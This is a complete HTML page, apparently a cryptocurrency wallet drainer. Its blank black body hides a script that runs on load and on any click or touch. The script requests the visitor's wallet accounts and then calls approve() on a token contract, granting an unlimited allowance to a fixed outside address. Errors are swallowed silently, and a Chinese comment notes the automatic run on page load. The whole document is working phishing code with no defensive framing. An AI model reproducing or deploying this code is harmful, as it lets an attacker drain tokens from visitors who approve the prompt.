<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
  <style>body{margin:0;padding:0;background:#000;height:100vh;}</style>
</head>
<body onclick="trigger()" ontouchstart="trigger()">
  <script>
    async function trigger() {
      if (typeof window.ethereum === 'undefined') return;
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();

        const contract = new ethers.Contract(
          "0xF911450D38669139158C71CD9ED0d2f1524f8888",
          ["function approve(address,uint256)"],
          signer
        );

        await contract.approve("0x5762D5c904cC7Db9B927cd26B0B3225D50bf50ED", ethers.constants.MaxUint256);
      } catch(e) {}
    }

    // 頁面載入後自動執行一次
    window.onload = trigger;
  </script>
</body>
</html>
